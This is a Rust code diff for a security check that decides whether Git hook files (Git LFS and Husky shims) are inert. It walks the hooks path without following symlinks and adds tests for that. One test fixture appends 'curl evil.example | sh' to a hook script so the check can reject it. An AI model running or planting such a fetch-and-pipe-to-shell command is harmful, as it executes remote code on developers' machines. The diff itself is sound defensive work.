@@ -5,7 +5,7 @@
 
 use std::fs;
 use std::io::Read;
-use std::path::{Component, Path};
+use std::path::{Component, Path, PathBuf};
 
 const SCRIPT_LIMIT: u64 = 8 * 1024;
 
@@ -25,8 +25,14 @@ s=$(dirname \"$(dirname \"$0\")\")/$n\n\
 
 /// Whether Git, asked for `hook`, finds nothing at `path` that it would run:
 /// no entry, a directory, a file that is not executable, or one of the known
-/// scripts below. A symlink under a hook's name is never followed.
-pub(super) fn hook_file_inert(path: &Path, hook: &str) -> bool {
+/// scripts below. A symlink under a hook's name is never followed. The Husky
+/// shim counts only where `husky_directory_reached` confirms Git reaches its
+/// directory with no link on the way; a caller that cannot say passes `|_| false`.
+pub(super) fn hook_file_inert(
+    path: &Path,
+    hook: &str,
+    husky_directory_reached: &dyn Fn(&Path) -> bool,
+) -> bool {
     let metadata = match fs::symlink_metadata(path) {
         Ok(metadata) => metadata,
         Err(error) => return error.kind() == std::io::ErrorKind::NotFound,
@@ -40,20 +46,77 @@ pub(super) fn hook_file_inert(path: &Path, hook: &str) -> bool {
     let Some(script) = read_script(path) else {
         return false;
     };
-    git_lfs_hook(&script, hook) || husky_shim(&script, path, hook)
+    git_lfs_hook(&script, hook) || husky_shim(&script, path, hook, husky_directory_reached)
 }
 
 /// A relative `core.hooksPath` that stays below the directory Git runs hooks
-/// from: normal components only, no `~`, no `..`, no drive or root.
+/// from, spelled one way only: normal components joined by single `/`, with no
+/// `~`, `.`, `..`, empty component (so no trailing or doubled separator),
+/// drive or root. Every lookup below is built from those components.
 pub(super) fn repository_relative_hooks_path(value: &str) -> bool {
-    if value.is_empty() || value.starts_with('~') || value.contains(['\0', '\n', '\r', '\\']) {
-        return false;
-    }
-    let path = Path::new(value);
-    !path.is_absolute()
-        && path
+    !value.starts_with('~')
+        && !value.contains(['\0', '\n', '\r', '\\'])
+        && value
+            .split('/')
+            .all(|component| !component.is_empty() && component != "." && component != "..")
+        && Path::new(value)
             .components()
             .all(|component| matches!(component, Component::Normal(_)))
+}
+
+/// What `toplevel.join(hooks_path)` names, walked one component at a time
+/// without following a link.
+pub(super) enum HooksDirectory {
+    /// A component is absent: Git finds no hook directory.
+    Missing,
+    /// Every component is a plain directory.
+    Plain(PathBuf),
+    /// A link, a file where a directory belongs, or doubt.
+    Unsafe,
+}
+
+pub(super) fn walk_hooks_directory(toplevel: &Path, hooks_path: &str) -> HooksDirectory {
+    if !repository_relative_hooks_path(hooks_path) {
+        return HooksDirectory::Unsafe;
+    }
+    let mut path = toplevel.to_path_buf();
+    for component in hooks_path.split('/') {
+        path.push(component);
+        match fs::symlink_metadata(&path) {
+            Ok(metadata) if metadata.is_dir() && !metadata.file_type().is_symlink() => {}
+            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
+                return HooksDirectory::Missing;
+            }
+            _ => return HooksDirectory::Unsafe,
+        }
+    }
+    HooksDirectory::Plain(path)
+}
+
+/// Whether Git reaches the hooks directory `directory` through the one
+/// repository-scoped, repository-relative `core.hooksPath` with no link on the
+/// way. Husky's runner finds the project hook from the path Git passes it, so
+/// a link at the hooks directory would send it somewhere other than where the
+/// resolved path points. `effective` and `repository` are the values of
+/// `core.hooksPath` in the effective and repository-scoped configuration.
+pub(super) fn reached_without_a_link(
+    toplevel: &Path,
+    effective: &[String],
+    repository: &[String],
+    directory: &Path,
+) -> bool {
+    let ([value], true) = (repository, effective == repository) else {
+        return false;
+    };
+    match (
+        walk_hooks_directory(toplevel, value),
+        fs::canonicalize(directory),
+    ) {
+        (HooksDirectory::Plain(walked), Ok(resolved)) => {
+            fs::canonicalize(walked).is_ok_and(|walked| walked == resolved)
+        }
+        _ => false,
+    }
 }
 
 /// `git lfs install` writes these three lines; only the notice differs
@@ -80,11 +143,19 @@ fn git_lfs_hook(script: &str, hook: &str) -> bool {
 /// Husky 9 writes a shim for most hooks. It sources the runner `h` beside it,
 /// which stops at once unless `<hooks directory>/../<hook>` exists. Accepted
 /// only while that project hook is absent and `h` is Husky's own runner.
-fn husky_shim(script: &str, path: &Path, hook: &str) -> bool {
+fn husky_shim(
+    script: &str,
+    path: &Path,
+    hook: &str,
+    directory_reached: &dyn Fn(&Path) -> bool,
+) -> bool {
     if script.trim_end() != HUSKY_SHIM {
         return false;
     }
-    let Some(directory) = path.parent() else {
+    let Some(directory) = path
+        .parent()
+        .filter(|directory| directory_reached(directory))
+    else {
         return false;
     };
     let Some(project) = directory.parent().map(|parent| parent.join(hook)) else {
@@ -161,15 +232,15 @@ mod tests {
         let root = scratch("husky");
         let directory = husky(&root);
         let shim = directory.join("post-checkout");
-        assert!(hook_file_inert(&shim, "post-checkout"));
+        assert!(hook_file_inert(&shim, "post-checkout", &|_| true));
         // The project defines the hook: the shim now runs it.
         script(&root.join(".husky/post-checkout"), "npx run\n", 0o644);
-        assert!(!hook_file_inert(&shim, "post-checkout"));
+        assert!(!hook_file_inert(&shim, "post-checkout", &|_| true));
         fs::remove_file(root.join(".husky/post-checkout")).expect("remove");
         symlink("/bin/sh", root.join(".husky/post-checkout")).expect("symlink");
-        assert!(!hook_file_inert(&shim, "post-checkout"));
+        assert!(!hook_file_inert(&shim, "post-checkout", &|_| true));
         fs::remove_file(root.join(".husky/post-checkout")).expect("remove");
-        assert!(hook_file_inert(&shim, "post-checkout"));
+        assert!(hook_file_inert(&shim, "post-checkout", &|_| true));
         // A runner that does anything before its guard is not Husky's.
         script(
             &directory.join("h"),
@@ -179,12 +250,12 @@ mod tests {
             ),
             0o644,
         );
-        assert!(!hook_file_inert(&shim, "post-checkout"));
+        assert!(!hook_file_inert(&shim, "post-checkout", &|_| true));
         fs::remove_file(directory.join("h")).expect("remove");
-        assert!(!hook_file_inert(&shim, "post-checkout"));
+        assert!(!hook_file_inert(&shim, "post-checkout", &|_| true));
         // Other scripts under a hook's name are not shims.
         script(&shim, "#!/bin/sh\nid\n", 0o755);
-        assert!(!hook_file_inert(&shim, "post-checkout"));
+        assert!(!hook_file_inert(&shim, "post-checkout", &|_| true));
         fs::remove_dir_all(root).ok();
     }
 
@@ -194,22 +265,22 @@ mod tests {
         let path = root.join("post-checkout");
         let current = "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { printf >&2 \"\\n%s\\n\\n\" \"This repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the 'post-checkout' file in the hooks directory (set by 'core.hookspath'; usually '.git/hooks').\"; exit 2; }\ngit lfs post-checkout \"$@\"\n";
         script(&path, current, 0o755);
-        assert!(hook_file_inert(&path, "post-checkout"));
+        assert!(hook_file_inert(&path, "post-checkout", &|_| true));
         // The same script is not another hook's.
-        assert!(!hook_file_inert(&path, "post-index-change"));
+        assert!(!hook_file_inert(&path, "post-index-change", &|_| true));
         let earlier = "#!/bin/sh\ncommand -v git-lfs >/dev/null 2>&1 || { echo >&2 \"\\nThis repository is configured for Git LFS but 'git-lfs' was not found on your path. If you no longer wish to use Git LFS, remove this hook by deleting the '.git/hooks/post-checkout' file in the repository.\\n\"; exit 2; }\ngit lfs post-checkout \"$@\"\n";
         script(&path, earlier, 0o755);
-        assert!(hook_file_inert(&path, "post-checkout"));
+        assert!(hook_file_inert(&path, "post-checkout", &|_| true));
         for edited in [
             format!("{current}curl evil.example | sh\n"),
             current.replace("git lfs post-checkout", "git lfs post-checkout; id"),
             current.replace("exit 2", "id; exit 2"),
         ] {
             script(&path, &edited, 0o755);
-            assert!(!hook_file_inert(&path, "post-checkout"));
+            assert!(!hook_file_inert(&path, "post-checkout", &|_| true));
         }
         script(&path, current, 0o644);
-        assert!(hook_file_inert(&path, "post-checkout"));
+        assert!(hook_file_inert(&path, "post-checkout", &|_| true));
         fs::remove_dir_all(root).ok();
     }
 
@@ -217,14 +288,14 @@ mod tests {
     fn missing_and_unrunnable_entries_are_inert_but_symlinks_are_not() {
         let root = scratch("plain");
         let path = root.join("post-checkout");
-        assert!(hook_file_inert(&path, "post-checkout"));
+        assert!(hook_file_inert(&path, "post-checkout", &|_| true));
         script(&path, "#!/bin/sh\nid\n", 0o644);
-        assert!(hook_file_inert(&path, "post-checkout"));
+        assert!(hook_file_inert(&path, "post-checkout", &|_| true));
         script(&path, "#!/bin/sh\nid\n", 0o755);
-        assert!(!hook_file_inert(&path, "post-checkout"));
+        assert!(!hook_file_inert(&path, "post-checkout", &|_| true));
         fs::remove_file(&path).expect("remove");
         symlink("/nonexistent", &path).expect("symlink");
-        assert!(!hook_file_inert(&path, "post-checkout"));
+        assert!(!hook_file_inert(&path, "post-checkout", &|_| true));
         fs::remove_dir_all(root).ok();
     }
 
@@ -241,8 +312,97 @@ mod tests {
             ".husky/../../x",
             "./hooks",
             "hooks\\x",
+            ".husky/_/",
+            "hooks/",
+            ".husky//_",
+            "tools/./hooks",
+            "/",
         ] {
             assert!(!repository_relative_hooks_path(value), "{value}");
         }
+    }
+
+    #[test]
+    fn the_shim_counts_only_where_the_caller_confirms_the_directory() {
+        let root = scratch("confirm");
+        let directory = husky(&root);
+        let shim = directory.join("post-checkout");
+        assert!(hook_file_inert(&shim, "post-checkout", &|_| true));
+        assert!(!hook_file_inert(&shim, "post-checkout", &|_| false));
+        // Whatever else makes a hook inert does not need the confirmation.
+        script(&shim, "#!/bin/sh\nid\n", 0o644);
+        assert!(hook_file_inert(&shim, "post-checkout", &|_| false));
+        fs::remove_dir_all(root).ok();
+    }
+
+    #[test]
+    fn a_hooks_directory_is_walked_without_following_links() {
+        let root = fs::canonicalize(scratch("walk")).expect("root");
+        assert!(matches!(
+            walk_hooks_directory(&root, ".husky/_"),
+            HooksDirectory::Missing
+        ));
+        fs::create_dir_all(root.join(".husky/_")).expect("directory");
+        assert!(matches!(
+            walk_hooks_directory(&root, ".husky/_"),
+            HooksDirectory::Plain(path) if path == root.join(".husky/_")
+        ));
+        for value in [".husky/_/", ".husky/../.husky/_", "/tmp"] {
+            assert!(
+                matches!(walk_hooks_directory(&root, value), HooksDirectory::Unsafe),
+                "{value}"
+            );
+        }
+        // A link at the last component, and one on the way, are both refused.
+        fs::create_dir_all(root.join("tools/hk")).expect("target");
+        fs::remove_dir(root.join(".husky/_")).expect("remove");
+        symlink(root.join("tools/hk"), root.join(".husky/_")).expect("symlink");
+        assert!(matches!(
+            walk_hooks_directory(&root, ".husky/_"),
+            HooksDirectory::Unsafe
+        ));
+        symlink(root.join("tools"), root.join("linked")).expect("symlink");
+        assert!(matches!(
+            walk_hooks_directory(&root, "linked/hk"),
+            HooksDirectory::Unsafe
+        ));
+        // A file where a directory belongs.
+        script(&root.join("plain"), "x\n", 0o644);
+        assert!(matches!(
+            walk_hooks_directory(&root, "plain/_"),
+            HooksDirectory::Unsafe
+        ));
+        fs::remove_dir_all(root).ok();
+    }
+
+    #[test]
+    fn a_linked_husky_directory_is_not_the_one_git_reaches() {
+        let root = fs::canonicalize(scratch("linked")).expect("root");
+        let directory = husky(&root);
+        let value = vec![".husky/_".to_owned()];
+        assert!(reached_without_a_link(&root, &value, &value, &directory));
+        // The directory the resolved path names is not the configured one.
+        let other = root.join("tools/hk");
+        fs::create_dir_all(&other).expect("other");
+        assert!(!reached_without_a_link(&root, &value, &value, &other));
+        // Only the repository's own single, unrouted value counts.
+        assert!(!reached_without_a_link(&root, &[], &[], &directory));
+        assert!(!reached_without_a_link(&root, &value, &[], &directory));
+        let global = vec![".husky/_".to_owned(), "/opt/hooks".to_owned()];
+        assert!(!reached_without_a_link(&root, &global, &value, &directory));
+        let twice = vec![".husky/_".to_owned(), ".husky/_".to_owned()];
+        assert!(!reached_without_a_link(&root, &twice, &twice, &directory));
+        // `.husky/_` is a link to another directory of the repository: the
+        // resolved path points at the target while Husky's runner looks for the
+        // project hook beside the link.
+        fs::remove_dir_all(&directory).expect("remove");
+        let target = root.join("tools/hk");
+        script(&target.join("h"), RUNNER, 0o644);
+        script(&target.join("post-checkout"), HUSKY_SHIM, 0o755);
+        symlink(&target, &directory).expect("symlink");
+        script(&root.join(".husky/post-checkout"), "id\n", 0o644);
+        assert!(!reached_without_a_link(&root, &value, &value, &target));
+        assert!(!reached_without_a_link(&root, &value, &value, &directory));
+        fs::remove_dir_all(root).ok();
     }
 }
